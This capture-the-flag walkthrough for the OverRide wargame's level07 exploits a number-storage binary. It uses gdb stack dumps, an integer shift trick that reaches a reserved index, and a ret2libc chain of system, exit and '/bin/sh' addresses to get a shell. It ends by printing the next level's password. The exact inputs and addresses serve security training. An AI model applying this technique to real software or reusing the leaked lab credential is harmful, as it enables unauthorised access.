Running this binary, we get : 

	level07@OverRide:~$ ./level07 
	----------------------------------------------------
	Welcome to wil's crappy number storage service!   
	----------------------------------------------------
	Commands:                                          
		store - store a number into the data storage    
		read  - read a number from the data storage     
		quit  - exit the program                        
	----------------------------------------------------
	wil has reserved some storage :>                 
	----------------------------------------------------

	Input command: 

We can store one number at a time in a given index. There is a security that prevents using any index divisible by 3 though, so index 0, 3, 6, etc..., are unwritable. Also, we can't access environment variables, so we won't be able to store a payload there. The most obvious thing to do is a ret2libc, where we overflow the stack return address with another function, in our case a call to system with /bin/sh as argument.

First, we need to know where we can overwrite the return address. First of all, let's find it by setting a breakpoint at the end of our program and looking at eip :

	(gdb) b *main+718
	Breakpoint 3 at 0x80489f1
	[...]
	Breakpoint 3, 0x080489f1 in main ()
	(gdb) i r
	[...]
	eip            0x80489f1	0x80489f1 <main+718> <-- not this one
	[...]
	(gdb) si
	0xf7e45513 in __libc_start_main () from /lib32/libc.so.6
	(gdb) i r
	[...]
	eip            0xf7e45513	0xf7e45513 <__libc_start_main+243>
	[...]

The second one is the one we want : 0xf7e45513

We can also have a look at the stack by using an easily identifiable number, for instance 238 <=> 0xee (at the index 1 because we can't access 0)

	Input command: store
	Number: 238
	Index: 1

	Breakpoint 3, 0x080486d5 in store_number ()
	(gdb) x/100x $esp
	0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
	0xffffd500:	0xffffd708	0xf7ff0a50	0x000000ee	0x00000001
	0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0x080488ef
	0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714
	0xffffd530:	0x00000098	0xffffffff	0xffffd7fc	0xffffd7a8
	0xffffd540:	0x00000000	0x00000000	0x000000ee	0x00000000 <------ here
	0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd560:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd570:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd580:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd590:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd5a0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd5b0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd5c0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd5f0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd600:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd610:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd620:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd630:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000

Lets find its address :

	(gdb) x 0xffffd548
	0xffffd548:	0x000000ee

If we keep going a bit further, we can find the eip return value we saw earlier :

	0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
	0xffffd6d0:	0x00000000	0x00000001	0x726f7473	0x00000065
	0xffffd6e0:	0x00000000	0x00000000	0x00000000	0x4cfa9200
	0xffffd6f0:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
	0xffffd700:	0x00000000	0x00000000	0x00000000	0xf7e45513 <----- return address
	0xffffd710:	0x00000001	0xffffd7a4	0xffffd7ac	0xf7fd3000
	0xffffd720:	0x00000000	0xffffd71c	0xffffd7ac	0x00000000
	0xffffd730:	0x080482b8	0xf7fceff4	0x00000000	0x00000000
	0xffffd740:	0x00000000	0xfe293c18	0xc92eb808	0x00000000
	0xffffd750:	0x00000000	0x00000000	0x00000001	0x08048510
	0xffffd760:	0x00000000	0xf7ff0a50	0xf7e45429	0xf7ffcff4
	0xffffd770:	0x00000001	0x08048510	0x00000000	0x08048531
	0xffffd780:	0x08048723	0x00000001	0xffffd7a4	0x08048a00
	0xffffd790:	0x08048a70	0xf7feb620	0xffffd79c	0xf7ffd918
	0xffffd7a0:	0x00000001	0xffffd8cc	0x00000000	0xffffd8e8
	0xffffd7b0:	0xffffd8f8	0xffffd90c	0xffffd92f	0xffffd942
	0xffffd7c0:	0xffffd94f	0xffffde70	0xffffde7c	0xffffdec9
	0xffffd7d0:	0xffffdee0	0xffffdeef	0xffffdf07	0xffffdf18
	0xffffd7e0:	0xffffdf21	0xffffdf3a	0xffffdf42	0xffffdf54
	0xffffd7f0:	0xffffdf64	0xffffdf9a	0xffffdfba	0x00000000
	0xffffd800:	0x00000020	0xf7fdb430	0x00000021	0xf7fdb000

Again, we get its address :

	(gdb) x 0xffffd70c
	0xffffd70c:	0xf7e45513

We stored the number ee at index 1, So we can know where is located the return address with a simple substraction : 0x70c - 0x548 = 0x1c4, 452 in decimal. One index can store 4 bytes, so if we divide it by 4 we get index 113. Let's keep in mind that we used index 1 instead of 0, so we need to add 1 to the result, we get the index 114.

Let's try to store something here to see what happens :

	Input command: store
	Number: 1111
	Index: 114
	*** ERROR! ***
	This index is reserved for wil!
	*** ERROR! ***
	Failed to do store command

Of course 114 % 3 = 0, so we can't write in there. However, there is one specific line in store_number that is interesting :

   0x080486c5 <+149>:	shl    $0x2,%eax

Basically, to go from indexes to bytes the binary will byteshift to the left twice (equivalent to multiply by 4).

114 in binary is 1110010, the 32bit repr is 00000000000000000000000001110010

If we byteshift left twice, we get : 00000000000000000000000111001000 (456 in dec, obviously).
But here's the thing : The 2 most significant bytes are removed. That means whatever is stored in them won't have an impact on the final result. Let's take our 114 in 32-bit repr, and add a 1 at the second MSB (to avoid negative numbers). We now get :

	01000000000000000000000001110010

This is equal to 1073741938 in decimal. That means byteshifting twice this number will yield the same result as byteshifting twice 114. By passing this number, we can access the index 114 (note that this number is not divisible by 3 itself, otherwise we still could not access index 114). Let's check it :

	Input command: store
	Number: 1234 
	Index: 1073741938
	Completed store command successfully
	Input command: read
	Index: 114
	Number at data[114] is 1234
	Completed read command successfully
	Input command: quit
	Segmentation fault (core dumped)

	level07@OverRide:~$ dmesg
	[...]
	[24161.934779] level07[3134]: segfault at 4d2 ip 00000000000004d2 sp 00000000ffffd730 error 14 in level07[8048000+1000]

0x4d2 <=> 1234, this way we can sucessfully store anything we want at the index 114.

Now, we just have to find the adresses of system, "/bin/sh", and exit (to gracefully exit the program, because segfaults can be detected).

[source](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)

	(gdb) p system
	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

	(gdb) p exit
	$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

	(gdb) info proc map
	process 1936
	Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
	(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
	0xf7f897ec
	1 pattern found.

Now we need to convert these addresses to decimal and store them using the binary :

system :    0xf7e6aed0 <=> 4159090384

exit :      0xf7e5eb70 <=> 4159040368

/bin/sh :   0xf7f897ec <=> 4160264172

	level07@OverRide:~$ ./level07 
	----------------------------------------------------
	Welcome to wil's crappy number storage service!   
	----------------------------------------------------
	Commands:                                          
		store - store a number into the data storage    
		read  - read a number from the data storage     
		quit  - exit the program                        
	----------------------------------------------------
	wil has reserved some storage :>                 
	----------------------------------------------------

	Input command: store
	Number: 4159090384
	Index: 1073741938
	Completed store command successfully
	Input command: store
	Number: 4159040368
	Index: 115
	Completed store command successfully
	Input command: store
	Number: 4160264172
	Index: 116
	Completed store command successfully
	Input command: quit
	$ cd ../level08
	$ cat .pass
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
